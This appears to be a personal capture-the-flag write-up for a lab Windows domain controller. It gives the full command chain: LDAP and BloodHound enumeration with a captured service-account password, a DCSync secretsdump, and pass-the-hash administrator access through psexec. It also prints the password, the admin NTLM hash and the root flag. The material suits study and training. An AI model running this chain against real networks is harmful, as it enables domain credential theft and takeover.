
```
ldapdomaindump ldaps://10.10.10.175 -u 'EGOTISTICALBANK\svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

```
bloodhound-python -d EGOTISTICALBANK.local -u svc_loanmgr -p 'Moneymakestheworldgoround!' -ns 10.10.10.175 -c all
```

It seems that the problem lies b/w the domain name.
![[Pasted image 20240502031931.png]]


Remember that i have seen something in winpeas that stand out
![[Pasted image 20240502031857.png]]

```
USERDOMAIN: EGOTISTICALBANK
USERDNSDOMAIN: EGOTISTICAL-BANK.LOCAL
```


So the command successfully run in the end
```
bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u svc_loanmgr -p 'Moneymakestheworldgoround!' -ns 10.10.10.175 -c all
```

![[Pasted image 20240502032554.png]]

Will run the Neo4j and Bloodhound console

So if you see SVC_loanmgr has Dsync rights
![[Pasted image 20240502033313.png]]

![[Pasted image 20240502033429.png]]

But let's see if we can run secret's dump or not cuz that's the 1st thing that comes to my mind.
```
secretsdump.py EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175
```
![[Pasted image 20240502034225.png]]


We  only want admin rights so will copy the admin hash and will simply pass it
```
823452073d75b9d1cf70ebdf86c7f98e
```


```
psexec.py EGOTISTICALBANK/administrator@10.10.10.175 -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e
```
![[Pasted image 20240502034412.png]]

Root flag
```
7a5dc0d7d40f0a8ef9663e81fbd11467
```
![[Pasted image 20240502034520.png]]
